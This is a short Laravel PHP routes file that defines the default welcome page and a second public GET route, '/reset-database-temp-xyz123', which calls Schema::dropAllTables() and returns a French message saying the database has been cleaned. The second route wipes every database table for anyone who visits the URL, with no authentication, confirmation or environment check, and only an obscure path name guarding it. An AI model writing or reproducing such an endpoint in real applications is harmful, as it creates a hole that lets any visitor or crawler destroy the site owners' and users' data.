<?php

use Illuminate\Support\Facades\Route;

Route::get('/', function () {
    return view('welcome');
});
Route::get('/reset-database-temp-xyz123', function () {
    Illuminate\Support\Facades\Schema::dropAllTables();
    return "Base de données nettoyée !";
});
